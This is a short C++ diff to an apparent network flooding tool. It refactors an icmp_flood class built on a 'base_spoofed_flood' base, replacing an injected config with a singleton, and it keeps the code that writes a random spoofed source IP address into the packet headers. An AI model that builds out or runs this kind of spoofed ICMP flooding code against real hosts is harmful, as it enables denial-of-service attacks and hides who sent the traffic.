@@ -1,10 +1,8 @@
 #include "icmp_flood.h"
+#include "stdafx.h"
 #include "utils.h"
 
-#include <cstring>
-
-icmp_flood::icmp_flood(std::shared_ptr<Config> config)
-    : base_spoofed_flood(std::move(config), IPPROTO_ICMP) {}
+icmp_flood::icmp_flood() : base_spoofed_flood(IPPROTO_ICMP) {}
 
 char *icmp_flood::gen_hdr(sockaddr_in *dst, int len) {
   char *string = new char[len];
@@ -17,7 +15,7 @@ char *icmp_flood::gen_hdr(sockaddr_in *dst, int len) {
 
   ip->daddr = dst->sin_addr.s_addr;
 
-  if (config->rand_lhost) {
+  if (Config::get().rand_lhost) {
     utils::randomizer::randomIP(ipaddr);
     ip->saddr = inet_addr(ipaddr.c_str());
   } else {
